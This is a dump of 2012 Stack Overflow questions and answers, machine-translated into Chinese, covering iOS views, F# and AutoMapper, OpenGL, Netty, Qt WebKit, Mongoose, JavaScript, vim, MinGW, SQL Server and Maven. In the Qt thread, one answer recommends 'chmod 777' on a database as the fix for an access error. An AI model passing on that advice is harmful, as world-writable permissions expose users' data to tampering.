> UIViewController 类是所有视图控制器对象的基类。它提供了加载视图、呈现视图、响应设备旋转而旋转它们以及其他几个标准系统行为的默认功能。UIKit 和其他框架定义了额外的视图控制器类来实现标准的系统接口，例如图像选择器、标签栏接口和导航接口。

[http://developer.apple.com/library/ios/#documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/AppArchitecture/AppArchitecture.html#//apple_ref/doc/uid/TP40007072-CH3-SW1](http://developer.apple.com/library/ios/#documentation/iPhone/Conceptual/iPhoneOSProgrammingGuide/AppArchitecture/AppArchitecture.html#//apple_ref/doc/uid/TP40007072-CH3-SW1)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-18T19:08:33.223

视图具有属性是好的，但不要将模型逻辑混入视图中。视图中的属性应该描述属性的外观，而不是属性包含的内容。我会避免在视图中有一个名为 valueLabel 的属性。

视图属性名称的一个示例是 UITableViewCell。它具有 imageView、textLabel 和 detailTextLabel 属性。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T18:57:31.650

`UIView`子类拥有属性是完全合理的。例如，您可能需要它们来实现`layoutSubviews`。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-18T19:20:33.777

这是完全合理的，如果您想创建一个允许交互和更好灵活性的可重用组件，请查看 UIControl（它是 UIView 的子类）

# f# - 将 AutoMapper 与 F# 一起使用

> ID：10658207
> 
> 赞同：9
> 
> 时间：2012-05-18T18:51:25.180
> 
> 标签：f#, automapper

我正在尝试使用F# 中的[AutoMapper](https://github.com/AutoMapper/AutoMapper)，但由于 AutoMapper 大量使用 LINQ 表达式，我无法设置它。

具体来说，AutoMapper 类型`IMappingExpression<'source, 'dest>`有一个带有这个签名的方法：

```
ForMember(destMember: Expression<Func<'dest, obj>>, memberOpts: Action<IMemberConfigurationExpression<'source>>) 
```

这通常在 C# 中使用，如下所示：

```
Mapper.CreateMap<Post, PostsViewModel.PostSummary>()
    .ForMember(x => x.Slug, o => o.MapFrom(m => SlugConverter.TitleToSlug(m.Title)))
    .ForMember(x => x.Author, o => o.Ignore())
    .ForMember(x => x.PublishedAt, o => o.MapFrom(m => m.PublishAt)); 
```

我制作了一个 F# 包装器来安排事物，以便类型推断可以工作。这个包装器允许我将上面的 C# 示例翻译成如下内容：

```
Mapper.CreateMap<Post, Posts.PostSummary>()
|> mapMember <@ fun x -> x.Slug @> <@ fun m -> SlugConverter.TitleToSlug(m.Title) @>
|> ignoreMember <@ fun x -> x.Author @>
|> mapMember <@ fun x -> x.PublishedAt @> <@ fun m -> m.PublishAt @>
|> ignore 
```

这段代码可以编译，就语法和用法而言，它看起来很干净。但是，在运行时 AutoMapper 告诉我：

> AutoMapper.AutoMapperConfigurationException：成员的自定义配置仅支持类型上的顶级单个成员。

我认为这是由于我必须转换`Expr<'a -> 'b>`为`Expression<Func<'a, obj>>`. 我使用强制转换将其转换为`'b`，`obj`这意味着我的 lambda 表达式不再是简单的属性访问。如果我在原始报价中将属性值装箱，并且根本不做任何拼接`forMember`（见下文），我会得到同样的错误。但是，如果我不将属性值装箱，我最终会得到与预期`Expression<Func<'a, 'b>>`的参数类型不匹配的.`ForMember``Expression<Func<'a, obj>>`

我认为如果 AutoMapper`ForMember`是完全通用的，这将起作用，但是强制成员访问表达式的返回类型是`obj`意味着我只能在 F# 中将它用于已经是直接类型`obj`而不是子类的属性。我总是可以使用将`ForMember`成员名称作为字符串的重载，但我想在我放弃编译时错字检查之前，我会检查是否有人有出色的解决方法。

我正在使用此代码（加上 F# PowerPack 的 LINQ 部分）将 F# 引用转换为 LINQ 表达式：

```
namespace Microsoft.FSharp.Quotations

module Expr =
    open System
    open System.Linq.Expressions
    open Microsoft.FSharp.Linq.QuotationEvaluation

    // http://stackoverflow.com/questions/10647198/how-to-convert-expra-b-to-expressionfunca-obj
    let ToFuncExpression (expr:Expr<'a -> 'b>) =
        let call = expr.ToLinqExpression() :?> MethodCallExpression
        let lambda = call.Arguments.[0] :?> LambdaExpression
        Expression.Lambda<Func<'a, 'b>>(lambda.Body, lambda.Parameters) 
```

这是 AutoMapper 的实际 F# 包装器：

```
namespace AutoMapper

/// Functions for working with AutoMapper using F# quotations,
/// in a manner that is compatible with F# type-inference.
module AutoMap =
    open System
    open Microsoft.FSharp.Quotations

    let forMember (destMember: Expr<'dest -> 'mbr>) (memberOpts: IMemberConfigurationExpression<'source> -> unit) (map: IMappingExpression<'source, 'dest>) =
        map.ForMember(Expr.ToFuncExpression <@ fun dest -> ((%destMember) dest) :> obj @>, memberOpts)

    let mapMember destMember (sourceMap:Expr<'source -> 'mapped>) =
        forMember destMember (fun o -> o.MapFrom(Expr.ToFuncExpression sourceMap))

    let ignoreMember destMember =
        forMember destMember (fun o -> o.Ignore()) 
```

## 更新：

我能够使用[Tomas 的示例代码](http://www.fssnip.net/c6)来编写这个函数，它会为`IMappingExpression.ForMember`.

```
let toAutoMapperGet (expr:Expr<'a -> 'b>) =
    match expr with
    | Patterns.Lambda(v, body) ->
        // Build LINQ style lambda expression
        let bodyExpr = Expression.Convert(translateSimpleExpr body, typeof<obj>)
        let paramExpr = Expression.Parameter(v.Type, v.Name)
        Expression.Lambda<Func<'a, obj>>(bodyExpr, paramExpr)
    | _ -> failwith "not supported" 
```

我仍然需要 PowerPack LINQ 支持来实现我的`mapMember`功能，但它们现在都可以工作。

如果有人感兴趣，他们可以在[这里找到完整的代码](http://www.fssnip.net/c7)。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2016-09-22T08:05:54.123

现在 F# 很乐意`Expression<Func<...>>`直接从`fun`表达式生成 a，这相对容易解决。现在最大的问题是 F# 编译器似乎被`ForMember`方法的重载弄糊涂了，无法正确推断出你想要什么。这可以通过定义具有不同名称的扩展方法来规避：

```
type AutoMapper.IMappingExpression<'TSource, 'TDestination> with
    // The overloads in AutoMapper's ForMember method seem to confuse
    // F#'s type inference, forcing you to supply explicit type annotations
    // for pretty much everything to get it to compile. By simply supplying
    // a different name, 
    member this.ForMemberFs<'TMember>
            (destGetter:Expression<Func<'TDestination, 'TMember>>,
             sourceGetter:Action<IMemberConfigurationExpression<'TSource, 'TDestination, 'TMember>>) =
        this.ForMember(destGetter, sourceGetter) 
```

然后，您可以`ForMemberFs`或多或少地使用原始方法`ForMember`，例如：

```
this.CreateMap<Post, Posts.PostSummary>()
    .ForMemberFs
        ((fun d -> d.Slug),
         (fun opts -> opts.MapFrom(fun m -> SlugConverter.TitleToSlug(m.Title))) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-18T20:56:11.497

我不太确定如何修复生成的表达式树（可以通过对其进行后处理来实现，但找出 AutoMapper 的期望是很痛苦的）。但是，有两种选择：

**作为第一个选项**- 您需要翻译的表达式相当简单。它们大多只是方法调用、属性获取器和变量的使用。这意味着应该可以将您自己的引用写入表达式树翻译器，以准确生成您想要的代码（然后您也可以添加自己的处理`obj`，也许通过调用`Expression.Convert`来构建表达式树）。我写了一个[简单的引文翻译器作为示例](http://www.fssnip.net/c6)，它应该可以处理您示例中的大部分内容。

**作为第二个选项**- 如果 AutoMapper 提供了一个选项来指定一个属性名称 - 你可以只使用表单的引号`<@ x.FooBar @>`。`Patterns.PropertyGet`使用该模式应该很容易解构这些。API 应该如下所示：

```
Mapper.CreateMap<Post, Posts.PostSummary>(fun post summary mapper ->
  mapper |> mapMember <@ post.Slug @> // not sure what the second argument should be?
         |> ignoreMember <@ post.Author @> ) 
```

或者，事实上，即使在第一种情况下，您也可以使用这种风格的 API，因为您不需要为每个映射重复编写 lambda 表达式，所以它可能会更好一些 :-)

# c++ - C++ 中的 OpenGL 实体立方体

> ID：10658213
> 
> 赞同：-4
> 
> 时间：2012-05-18T18:51:52.007
> 
> 标签：c++, opengl

我正在尝试使用 OpenGl 功能在 C++ 中绘制一个实心立方体，但我想将它绘制在所需的位置，例如`glVertex3f(20,5,-35)`. 如何在给定位置绘制一个实心立方体？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:04:05.690

glTranslatef(x, y, z)。谷歌一下，我想也有2D版本。但这会将参考帧从堆栈中转换出来。如果需要设置更复杂的转换，则需要调用 glpopmatrix 和 glpushmatrix。小心那些拼写和用法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T20:02:40.700

要匹配您的问题并在 OpenGL（兼容性配置文件）中绘制立方体，您可以使用以下代码：

```
 void drawCube(float x, float y, float z) 
    {
    glBegin(GL_QUADS); 
    glVertex3f(-1.0f+x, -1.0f+y, -1.0f+z);
    glVertex3f(1.0f+x, -1.0f+y, -1.0f+z);
    glVertex3f(1.0f+x, 1.0f+y, -1.0f+z);
    glVertex3f(-1.0f+x, 1.0f+y, -1.0f+z);

    glVertex3f(-1.0f+x, -1.0f+y, -1.0f+z);
    glVertex3f(-1.0f+x, -1.0f+y, 1.0f+z);
    glVertex3f(-1.0f+x, 1.0f+y, -1.0f+z);
    glVertex3f(-1.0f+x, 1.0f+y, 1.0f+z);

    glVertex3f(-1.0f+x, -1.0f+y, -1.0f+z);
    glVertex3f(-1.0f+x, -1.0f+y, 1.0f+z);
    glVertex3f(1.0f+x, -1.0f+y, 1.0f+z);
    glVertex3f(1.0f+x, -1.0f+y, -1.0f+z);

    glVertex3f(-1.0f+x, -1.0f+y, 1.0f+z);
    glVertex3f(1.0f+x, -1.0f+y, 1.0f+z);
    glVertex3f(1.0f+x, 1.0f+y, 1.0f+z);
    glVertex3f(-1.0f+x, 1.0f+y, 1.0f+z);

    glVertex3f(-1.0f+x, -1.0f+y, 1.0f+z);
    glVertex3f(1.0f+x, -1.0f+y, 1.0f+z);
    glVertex3f(1.0f+x, 1.0f+y, 1.0f+z);
    glVertex3f(-1.0f+x, 1.0f+y, 1.0f+z);

    glVertex3f(-1.0f+x, 1.0f+y, -1.0f+z);
    glVertex3f(-1.0f+x, 1.0f+y, 1.0f+z);
    glVertex3f(1.0f+x, 1.0f+y, 1.0f+z);
    glVertex3f(1.0f+x, 1.0f+y, -1.0f+z);

    glEnd();
     } 
```

**我不推荐这个功能**，而是使用[`glTranslatef(x, y, z)`](http://www.opengl.org/sdk/docs/man/xhtml/glTranslate.xml)另一个答案中描述的解决方案。喜欢这个功能：

```
 void drawCube(float x, float y, float z) 
    {
        glPushMatrix();
        glTranslatef(x, y, z);

        glBegin(GL_QUADS); 
        glVertex3f(-1.0f,-1.0f ,-1.0f);
        glVertex3f(1.0f, -1.0f, -1.0f);
        glVertex3f(1.0f, 1.0f, -1.0f);
        glVertex3f(-1.0f, 1.0f, -1.0f);

        glVertex3f(-1.0f, -1.0f, -1.0f);
        glVertex3f(-1.0f, -1.0f, 1.0f);
        glVertex3f(-1.0f, 1.0f, -1.0f);
        glVertex3f(-1.0f, 1.0f, 1.0f);

        glVertex3f(-1.0f, -1.0f, -1.0f);
        glVertex3f(-1.0f, -1.0f, 1.0f);
        glVertex3f(1.0f, -1.0f, 1.0f);
        glVertex3f(1.0f, -1.0f, -1.0f);

        glVertex3f(-1.0f, -1.0f, 1.0f);
        glVertex3f(1.0f, -1.0f, 1.0f);
        glVertex3f(1.0f, 1.0f, 1.0f);
        glVertex3f(-1.0f, 1.0f, 1.0f);

        glVertex3f(-1.0f,-1.0f ,1.0f );
        glVertex3f(1.0f, -1.0f, 1.0f);
        glVertex3f(1.0f, 1.0f, 1.0f);
        glVertex3f(-1.0f, 1.0f, 1.0f);

        glVertex3f(-1.0f, 1.0f, -1.0f);
        glVertex3f(-1.0f, 1.0f, 1.0f);
        glVertex3f(1.0f, 1.0f, 1.0f);
        glVertex3f(1.0f, 1.0f, -1.0f);
        glEnd();

        glPopMatrix();
    } 
```

这个功能远非完美，但应该足够了。快乐编码！

# netty - 功能请求：带有 netty 的 udp 服务器：为每个远程地址创建一个通道

> ID：10658215
> 
> 赞同：3
> 
> 时间：2012-05-18T18:52:09.073
> 
> 标签：netty

***ConnectionlessBootstrap***在绑定时创建单个 Channel。同一通道用于上游用于来自所有远程地址的所有传入消息，下游用于传出消息。因此使用相同的管道对象。

***ServerBootstrap***在连接时为每个远程地址创建一个新通道，因此创建了一个新管道。

ConnectionlessBootstrap 最好为每个远程地址创建一个新通道。这将允许使用“通道特定的处理程序”，例如 ChannelTrafficShapingHandler 或 OrderedMemoryAwareThreadPoolExecutor。该通道应用于发送到同一远程地址的所有传入/传出消息。

然后还可以使用没有远程地址的 channel.write()，从而更容易将 tcp 应用程序移植到 udp。

由于我们没有断开连接，因此可以使用 ReadTimeoutHandler 关闭通道。

目前，如果需要这些处理程序的功能，则必须“在管道之外”重新实现，其中数据存储在远程地址特定对象中。

你怎么看 ？

——罗恩

# qt - qt webkit中的数据库访问问题

> ID：10658216
> 
> 赞同：0
> 
> 时间：2012-05-18T18:52:09.523
> 
> 标签：qt, post, qtwebkit, qnetworkaccessmanager

我在我的 Qt MainWindow 中有一个作为 WebView 加载的 HTML 文件，该文件位于 localhost XAMPP 文件夹中。该文件基本上从用户那里获取两个日期和时间间隔，当用户单击“获取查询”按钮时，地图显示查询的总量 - 从 XAMPP 上的 MySQL 数据库获取 - 作为热图。但是，尝试从 Qt 运行此 HTML 文件 - 单击 HTML 窗口的 F​​etch 查询按钮 - 给我 Ajax POST 错误，我无法从 Qt 访问数据库，而 localhost 副本可以。我还尝试发布到使用 NetworkAccessManager 获取查询的 PHP 文件，但我得到了一个“未知错误”作为回复。有没有一种特殊的方法来解决这个问题？HTML-jQuery 代码和 NetworkAccessManager 帖子代码如下：

HTML-jQuery 部分：

```
<form id="ajaxForm" action="index.php" method="post">

Start <input type="text" name = "date1" id = "datepicker" value = "2011-07-13" style = "width:70px">
<input type="text" name = "time1" id = "timepicker1" value = "00:00" style = "width:40px"> 
--
End <input type="text" name = "date2" id = "datepicker2" value = "2011-07-13" style = "width:70px">
<input type="text" name = "time2" id = "timepicker2" value = "00:01" style = "width:40px">

<select name = "freq">
  <option value = "all" selected = "true">all</option>
  <option value = "hourly">hourly</option>
  <option value = "daily">daily</option>
  <option value = "weekly">weekly</option>
  <option value = "monthly">monthly</option>
</select>

data between 
    <input type="text" id="time" style="border:0; color:#f6931f; font-weight:bold;" />

    <input type="submit" name="fetch" value="Fetch">

</form> 
```

我用来测试我的 PHP 文件以获取回复的 NetworkAccessManager 部分：

```
QNetworkAccessManager* mNetworkManager = new QNetworkAccessManager(this);
QObject::connect(mNetworkManager, SIGNAL(finished(QNetworkReply*)), this, SLOT(onNetworkReply(QNetworkReply*)));
connect(mNetworkManager, SIGNAL(finished(QNetworkReply*)),
        this, SLOT(replyFinished(QNetworkReply*)));
QUrl url = "http://localhost/heatQuery.php";

QUrl params;
params.addQueryItem("date1","2011-07-13");
params.addQueryItem("time1","00:00");
params.addQueryItem("date2","2011-07-13");
params.addQueryItem("time2","13:00");
params.addQueryItem("freq","hourly");

QByteArray data;
data.append(params.toString());
data.remove(0,1);

QNetworkRequest request;
request.setUrl(url);
request.setHeader(QNetworkRequest::ContentTypeHeader,
QVariant("application/x-www-form-urlencoded"));
mNetworkManager->post(request, data);

void MainWindow::replyFinished(QNetworkReply *reply){
//Use the reply as you wish
QString text(reply->errorString());
std::cout<<"REPLY IS" << text.toStdString() << std::endl;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:02:51.823

由于 localhost 副本成功访问数据库，`Change the permission of your database and then run`.

要更改数据库权限以完全执行此[假设您正在使用 linux] 命令。

```
 chmod 777 database_name 
```

# mongodb - 猫鼬动态附加模式以动态验证

> ID：10658221
> 
> 赞同：0
> 
> 时间：2012-05-18T18:52:27.063
> 
> 标签：mongodb, mongoose

我想根据`schema.pre('save',function(..){...})`. 如果可能的话，如何做到这一点？

一些（简化的）模式和背景：

```
var fact= new Schema({  
    name: { type: String, required: true, index: { unique: false }}
    ,value: {type:  {}, required: true}  
    ,moreinfodesc: { type: String, required: false} 
    ,createddate : { type: Date, required: true, default: Date.now, select: false } }
}, { collection: 'Fact' } );

var factSchema= new Schema({
    name: { type: String, required: true, index: { unique: true }}
    , valueType: { type: {}, required: true}                                        
    ,isMulti: {type: Boolean, required: true }

    //ACL-stuff
    ,directChangeRoles: {type: [String]} //i.e: [super, admin,owner]
    ,suggestChangeRoles: {type: [String]} //ie: [editor]
    ,enum: {type: [{}]} 
    ,mixins: {type: [String]} 
}, { collection: 'FactSchema' }); 
```

这是一个简化的结构，允许编辑特定“实体”的“事实”。

```
e.g: entityA.facts=[fact] 
```

从模式中可以看出，`fact.value`就猫鼬而言，它可以具有任何类型。但是，我想在运行时将其限制为 `FactSchema.valueType`(a String contains "Boolean", "String" 或更复杂的 "[Tag]") 中定义的模式。这可能看起来很麻烦，但这是我想走的路，原因有几个。

因此，假设对于一个特定的事实，`fact.name=tags`我想在运行时分配 `fact.value`类型`[Tag]`。为此，我会`Tag`像往常一样设置一个带有验证的 -schema 并`fact.value`针对它进行验证。

我正在考虑以某种方式将`[Tag]`-schema “附加”到`fact.value`in`fact.pre('save',function(..){.. //validation here })`并希望验证会神奇地发生，就好像在设计时而不是运行时`fact.value`分配了类型一样。`[Tag]`

最后一个问题：我不知道是否可以进行“附加”，如果可以，怎么做？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T18:27:45.367

在运行时“附加”是不可能的，但您可以将自定义验证器添加到您的路径并将其逻辑基于当前文档状态：

[https://gist.github.com/2789681](https://gist.github.com/2789681)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-03-11T08:47:27.870

尝试使用[猫鼬鉴别](https://mongoosejs.com/docs/discriminators.html)器 如果需要，您可以在运行时更改验证：

```
YourModelName.schema.path('your_field_name').required(false); 
```

# javascript - 在javascript中迭代焦点组件

> ID：10658222
> 
> 赞同：2
> 
> 时间：2012-05-18T18:52:31.873
> 
> 标签：javascript, components

我有一些链接，想自动一个一个地传递焦点。我正在使用下面的代码。通过焦点效果很好，但只有一次。第一次焦点传递，链接改变颜色，然后传递到下一个。前一个再次变黑，下一个被涂成红色。没问题。但是当它到达最终链接时不会重新启动。

```
var i = 0;
var letras = document.getElementsByTagName("a");

function pasaLink() {
    if (i == 0) {
        letras[letras.length-1].style.color = "black";
    } else {
        letras[i-1].style.color = "black";
    }
    letras[i].style.color = "red";
    letras[i].focus();
    i++;
    if (i > letras.length) {
        i= 0;
    }
    setTimeout("pasaLink()",2000);
} 
```

最后`if`，`i=0;`我试图在到达最终元素时返回初始索引，然后重新启动以迭代`letras`. 这个函数在 body.onload() 中调用。

任何想法为什么它不起作用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:00:48.110

Change your `if` to:

```
if (i >= letras.length) {   
   i= 0;     
} 
```

**Working example:**
[http://jsfiddle.net/nivas/Nn62Q/](http://jsfiddle.net/nivas/Nn62Q/)
(click the `Orig` Button to see the behavior of your code and the `New` button to see the behavior of the new one. I have added a `try...catch` to show the error)

**Explanation:**
Let us say there are five `a` tags. You make `i = 0` when `i > 6` (i.e., `6`). But when `i` becomes `5`, `letras[i].style.color = "red";` at the beginning of the function fails and an exception is throws a exception. The flow stops here so the `if (i > letras.length)` will never be reached.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T18:57:19.500

你的情况不应该是

```
if (i == letras.length) {
    i= 0;
} 
```

反而？

一旦`i`等于数组的长度，请重置。

# jquery - 打开时关闭对jquery对话框的自动对焦

> ID：10658224
> 
> 赞同：0
> 
> 时间：2012-05-18T18:52:48.187
> 
> 标签：jquery, jquery-ui, dialog

[这是我的网站](http://www.bunch-it.com)，我的弹出气泡有问题。这些实际上是 jquery 对话框。当您向下滚动页面到视频时，它们会在弹出时强制您向上滚动。如何关闭这些对话框的自动对焦功能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T20:44:10.947

不确定您在网站上的活跃程度，但问题是因为您用来打开对话框的链接有一个哈希标记作为 href：

```
<a href="#">open dialog</a> 
```

锚点中的这个散列表示一个散列链接。如果没有 id，它会使用 window 对象并滚动回页面顶部。

为了防止，使用：

```
<a href="javascript: void(0);">open dialog</a> 
```

# vim - 如何删除直到分隔符结束？

> ID：10658230
> 
> 赞同：7
> 
> 时间：2012-05-18T18:53:24.487
> 
> 标签：vim

在 vim 中，我知道输入 di' 将删除由单个撇号括起来的文本，

```
'hello world' => <di'> => '' 
```

但是可以说我想删除直到撇号结束？

例如：

```
'hello world' => <delete command with cursor on w> => 'hello ' 
```

有没有明显的方法可以做到这一点？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-05-18T18:58:53.430

我认为这就是你想要的：

```
dt' 
```

使用助记符“ **d** elete **t** ill '”来记住。`dT'`将向后删除，留下“世界”。还有`df'`一个会删除所有内容，包括撇号。[有关查找和直到的更多信息，请单击此处](http://vim.wikia.com/wiki/Tutorial#Find_and_till)。

# c# - 从服务器远程访问文件

> ID：10658232
> 
> 赞同：-2
> 
> 时间：2012-05-18T18:53:32.470
> 
> 标签：c#, remoting

正如标题所说，我需要从服务器远程访问文件。完成此操作后，我需要以 Windows 文件/文件夹对话框样式显示文件。我需要使用远程处理。这不是那么简单，因为我有一些问题：

1.  我无权访问客户端 UNC 共享；
2.  我不知道 \server\xpto 物理指向的位置；
3.  服务器上的服务必须使用物理路径。

此外，必须启用共享（并非总是如此），我需要提示用户名/密码，并且我将拥有网络路径，而不是物理路径。

因此，这就像使用客户端应用程序访问数据中心中的服务器一样。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-13T08:23:57.633

我想你可以通过一个网络应用程序来做到这一点。在服务器上创建一个页面，该页面可以访问服务器上的本地文件并在网格上显示它们的列表。您也可以在文件上添加一些命令。您创建的页面将充当中间件，以反映您想要对文件进行的操作。

希望能帮助到你。

# javascript - jquery - 在页面问题上过滤 html 元素

> ID：10658234
> 
> 赞同：1
> 
> 时间：2012-05-18T18:53:40.917
> 
> 标签：javascript, jquery, filter

我创建了一个 javascript 过滤器，它可以正常工作，但并非一直有效。要首先看到这一点，请访问以下[链接](http://www.golfballnut.com/collections/bridgestone-golf-balls)。在左侧，单击“品牌型号”下的普利司通 e6 链接。它什么也不返回，但实际上它应该在视图中返回 3 个产品。

过滤器的工作方式如下。我抓取侧边栏上单击的项目的值，然后在主视图中搜索 html 元素以查看是否有任何匹配项。如果有，我只在视图中显示这些产品并隐藏其余产品。

处理这个问题的 javascript 是（你也可以[在这里](http://cdn.shopify.com/s/files/1/0058/2522/assets/collection-filters.js?104190)看到）：

我的 JS 中是否存在空格问题或不正确的问题？我尝试使用 jQuery 修剪功能无济于事。

的JavaScript：

```
var noProductMatches = jQuery('.no-products-found');

jQuery('#filter-by-brand li a').click(function() 
{
    noProductMatches.hide();

    var brandNameSelected = jQuery(this).html();
    var productVendorFromCollection = jQuery("#product-vendor");
    var productContainer = jQuery('#product-collection .productBoxWrapper');

    if (brandNameSelected == 'All Brands' )
    {
        productContainer.fadeIn("slow");
    }
    else 
    {
        var results = jQuery(".productBoxWrapper")
            .fadeOut(100)
            .delay(100)
            .filter(function() 
            {
                return jQuery(this).html().indexOf(brandNameSelected) > -1 || jQuery(this).html().indexOf(productVendorFromCollection) > -1;  
            })
            .each(function(index, item) 
            {
                jQuery(item).fadeIn("slow");
            });

            if (results.length == 0)
            {
                noProductMatches.fadeIn();
            }
    }
});

jQuery('#filter-by-model li a').click(function() 
{
    noProductMatches.hide();

    var brandNameSelected = jQuery.trim(jQuery(this).html());
    var productContainer = jQuery('#product-collection .productBoxWrapper');

    if (brandNameSelected == 'Any Model' )
    {
        productContainer.fadeIn("slow");
    }
    else 
    {
        var results = productContainer
            .fadeOut(100)
            .delay(100)
            .filter(function() 
            {
                return jQuery.trim(jQuery(this).html()).indexOf(brandNameSelected) > -1;  
            })
            .each(function(index, item) 
            {
                jQuery(item).fadeIn("slow");
            });

            if (results.length == 0)
            {
                noProductMatches.fadeIn();
            }
    }
});

jQuery('#filter-by-price li a').click(function() 
{
    noProductMatches.hide();

    var priceRangeSelectedItem = jQuery(this).html();
    var minSelectedPrice = parseInt( jQuery(this).attr("name") );
    var maxSelectedPrice = parseInt( jQuery(this).attr("title") );
    var productContainer = jQuery('#product-collection .productBoxWrapper');

    if (priceRangeSelectedItem == 'Any Price')
    {
        productContainer.fadeIn("slow");
    }
    else
    {
        var results = jQuery(".productBoxWrapper")
            .fadeOut(100)
            .delay(100)
            .filter(function() 
            {
                var minProductPrice = parseInt( jQuery(this).find("#lowestPriceRange").html() );
                var maxProductPrice = parseInt( jQuery(this).find("#highestPriceRange").html() );
                //alert(minProductPrice);
                //alert(maxProductPrice);

                return (minProductPrice >= minSelectedPrice &&  maxProductPrice <= maxSelectedPrice);
            })
            .each(function(index, item) 
            {
                jQuery(item).fadeIn("slow");
            });

            if (results.length == 0)
            {
                noProductMatches.fadeIn();
            }
    }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:09:26.547

问题是它是混合大小写的。在菜单中显示普利司通 e6，但在页面上显示普利司通 E6，并带有大写 E。当您搜索我们时，您必须将所有内容都设为小写，确保它们在菜单和页面上相同。

# c - MinGW：读取二进制数据失败

> ID：10658235
> 
> 赞同：2
> 
> 时间：2012-05-18T18:53:42.980
> 
> 标签：c

我正在尝试使用 MinGW 编译的程序在 Windows 7 上读取二进制文件。二进制文件的大小约为 10M，但我的程序只能读取不到 1000 个字节，并且它认为它达到了 EOF。

这是代码。我确定我在做一些愚蠢的事情，但我似乎无法找到它。

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#define TS_FILE "foo.data"

int main(void)
{
    int fd;
    int r;
    unsigned char buf[1024];

    fd = open(TS_FILE, O_RDONLY|O_BINARY);
    printf("fd: %d\n", fd);

    if ( fd == -1 )
    {
        exit(0);
    }

    for (;;)
    {
        r = read(fd, buf, 1000);
        if ( r != 1000 )
        {
            printf("read error. %d\n", r);
            perror("read");
        }

        if ( r == 0 )
        {
            break;
        }
    }
    close(fd);
} 
```

程序会说它读取 736 个字节，这就是 EOF。

有人可以告诉我发生了什么事吗？谢谢！

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:07:00.277

事实上，您的程序确实在读取整个文件。它一次读取文件 1000 个字节，直到在本例中还剩 736 个字节。然后它读取最后的 736 个字节并`read`返回`736`。您错误地将无法读取完整的 1000 个字节视为错误，但这不是错误。如果`read`失败，则错误条件由返回值为 -1 来标记。

您的循环可能应该更像这样：

```
for (;;)
{
    r = read(fd, buf, 1000);
    if (r == -1)
    {
        printf("read error\n");
        perror("read");
        exit(1);
    }

    if (r != 1000)
    {
        //entire file has been read
        break;
    }
}
close(fd); 
```

其他几点：

1.  的正确类型`r`是`size_t`。
2.  而不是硬编码`1024`and `1000`，你会更好地使用类似的东西，`#define BUFFLEN 1024`这样你就不会一直重复那些神奇的值。

# sql-server - 列出 SQL Server 中不是 PK/FK 的所有约束

> ID：10658236
> 
> 赞同：1
> 
> 时间：2012-05-18T18:54:04.073
> 
> 标签：sql-server, tsql

除了明显的主/外键约束之外，是否有一种快速的方法来获取数据库中所有约束的列表？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-18T18:55:36.473

假设 SQL Server 2005+（指定SQL Server 的*版本*总是有用的！）：

```
SELECT 
  [constraint] = name, 
  [object] = QUOTENAME(OBJECT_SCHEMA_NAME(parent_object_id))
    + '.' + QUOTENAME(OBJECT_NAME(parent_object_id)),
  [definition]
FROM sys.check_constraints
ORDER BY [object], name;

SELECT 
  [constraint] = name,
  [object] = QUOTENAME(OBJECT_SCHEMA_NAME(parent_object_id))
    + '.' + QUOTENAME(OBJECT_NAME(parent_object_id)),
  [definition]
FROM sys.default_constraints
ORDER BY [object], name; 
```

如果要将它们组合成一个结果集：

```
SELECT 
  [constraint] = name, 
  type_desc,
  [object] = QUOTENAME(OBJECT_SCHEMA_NAME(parent_object_id))
    + '.' + QUOTENAME(OBJECT_NAME(parent_object_id)),
  [definition]
FROM sys.check_constraints
UNION ALL
SELECT 
  [constraint] = name,
  type_desc,
  [object] = QUOTENAME(OBJECT_SCHEMA_NAME(parent_object_id))
    + '.' + QUOTENAME(OBJECT_NAME(parent_object_id)),
  [definition]
FROM sys.default_constraints
ORDER BY [object], name; 
```

# maven - 扩展 Maven POM XML

> ID：10658237
> 
> 赞同：2
> 
> 时间：2012-05-18T18:54:04.673
> 
> 标签：maven

我想扩展 Maven POM 以包含有关依赖项的元信息。我这样做是为了让律师高兴，并阻止开发人员必须每季度审核一次 POM，以查看我们添加的法律尚未“批准”的 OSS：P

所以我想添加这样的东西：

```
 <dependency>
        <groupId>junit</groupId>
        <artifactId>junit</artifactId>
        <version>4.8.2</version>
        <license>Common Public License - v 1.0<license>
        <approved>true</approved>
    </dependency> 
```

然后我可以编写一个 maven 插件或只是一个 groovy 脚本来审核我的条目并告诉我缺少什么。

我找不到任何好的方法来做到这一点？甚至可能吗？如果没有，是否有人对处理此问题的方法提出建议？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T21:01:09.713

[Sonatype 的 Insight 产品](http://www.sonatype.com/Products/Sonatype-Insight)是我见过的这个问题的最佳解决方案。

[将它与Nexus Professional](http://sonatype.com/Products/Nexus-Professional)提供的采购功能相结合，它可以在您的公司应用程序中实现对 OSS 的监管和审计。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T18:59:15.153

许可证信息已经在依赖项的 pom 中，因此添加它没有意义。如果您需要更多类似的信息，您应该查看 Sonatype Insight 及其在 Sonatype Nexus 中的集成以及适用于 Hudson 或 Jenkins 的 Insight for CI 插件。它将向您显示声明的许可证以及在代码中找到的许可证以及更多其他数据。

